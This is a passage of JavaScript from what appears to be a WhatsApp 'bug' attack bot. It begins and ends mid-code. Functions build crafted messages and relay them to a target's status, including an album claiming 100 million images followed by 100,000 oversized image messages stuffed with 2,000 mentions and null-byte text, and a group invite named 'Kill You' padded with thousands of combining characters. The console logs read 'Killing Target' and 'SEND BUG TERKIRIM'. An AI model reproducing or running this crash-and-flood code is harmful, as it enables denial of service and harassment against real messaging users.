            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [jid],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: jid
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [jid],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: jid
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [jid],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: jid
                  },
                  content: undefined
               }]
            }]
         }]
      });
      console.log(chalk.red(`SEND BUG TERKIRIM ${jid}`));
   } catch (err) {
      console.error(err);
   }
};

async function delay2(jid)  {
   const album = await generateWAMessageFromContent(jid, {
      albumMessage: {
         expectedImageCount: 100000000,
         expectedVideoCount: 0, //trigger
      }
   }, {});
   
   const imagePayload = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
        fileLength: 99999999999,
        height: 1280,
        width: 720,
        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&_nc_hot=1758521044",
        mediaKeyTimestamp: 1758521043,
        isSampled: true, 
        viewOnce: false, 
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true, 
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399602691477@newsletter", 
            newsletterName: "7eppeli", 
            contentType: "UPDATE_CARD", 
            accessibilityText: "\u0000".repeat(9000), 
            serverMessageId: 18888888
          }, 
          mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
        scanLengths: [3599, 9271, 2026, 2778],
        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=", 
        annotations: [
          {
            polygonVertices: [
              {
                x: 0.05515563115477562,
                y: 0.4132135510444641
              },
              {
                x: 0.9448351263999939,
                y: 0.4132135510444641
              },
              {
                x: 0.9448351263999939,
                y: 0.5867812633514404
              },
              {
                x: 0.05515563115477562,
                y: 0.5867812633514404
              }
            ],
            newsletter: {
              newsletterJid: "120363399602691477@newsletter",
              serverMessageId: 3868,
              newsletterName: "7eppeli",
              contentType: "UPDATE_CARD",
              accessibilityText: "\u0000".repeat(1000) 
            }
          }
        ]
     }
   };
   
   const messages = [];
   for (let i = 0; i < 100000; i++) {

      const imgMsg = await generateWAMessageFromContent(jid, imagePayload, {});  
      imgMsg.message.messageContextInfo = {  
         messageAssociation: {  
            associationType: 1,  
            parentMessageKey: album.key  
         }  
      };  
      messages.push(imgMsg);
   }

   await sock.relayMessage("status@broadcast", album.message, {
      messageId: album.key.id,
      statusJidList: [jid]
   });
   
   for (const msg of messages) {
      await sock.relayMessage("status@broadcast", msg.message, {
         messageId: msg.key.id,
         statusJidList: [jid]
      });
   }
}

async function blankgacor(jid) {
console.log(chalk.red(` 𝐊𝐢𝐥𝐥𝐢𝐧𝐠 𝐓𝐚𝐫𝐠𝐞𝐭`));
const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: "Kill You" + ":҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝